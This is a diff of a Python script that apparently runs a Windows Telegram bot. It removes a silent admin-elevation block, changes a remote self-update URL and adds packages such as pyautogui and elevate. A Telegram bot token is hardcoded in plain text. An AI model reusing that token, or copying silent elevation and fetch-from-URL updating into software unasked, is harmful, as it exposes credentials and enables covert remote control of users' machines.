@@ -17,11 +17,6 @@ from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandl
 from elevate import elevate
 from win32com.shell import shell
 
-if shell.IsUserAnAdmin():
-    print()
-else:
-    elevate(show_console=False)
-
 
 
 
@@ -29,7 +24,7 @@ file=sys.argv[0]
 #Token for the telegram bot.
 token="6199318379:AAGmrDxxhYeYWabD8MqyrMMwKvVztDkPhGE"
 #url for online update source
-url="https://raw.githubusercontent.com/Mainakdey1/PythonStuff/main/somefile.py"
+url="https://raw.githubusercontent.com/Mainakdey1/PythonStuff/main/development_file.py"
 
 
 
@@ -82,7 +77,7 @@ class logger:
 
 
 
-__version__=1.04
+__version__=1.05
 
 
 
@@ -98,7 +93,7 @@ logins=logger("logfile.txt",0,"globallogger")
 
 
 try:
-    required={"python-telegram-bot","psutil","datetime","messages"}
+    required={"python-telegram-bot","psutil","datetime","messages","urllib3","regex","psutil","datetime","pyautogui","elevate"}
     installed={pkg.key for pkg in pkg_resources.working_set}
     missing=required-installed
     if missing:
@@ -107,6 +102,7 @@ try:
 
 except:
     logins.critical("PACKAGE INSTALLER","PACKAGES NOT INITIALIZED")
+    logins.critical("PACKAGE INSTALLER","THE FOLLOWING PACKAGES WERE NOT INSTALLED:   "+str(missing))
     
 
 
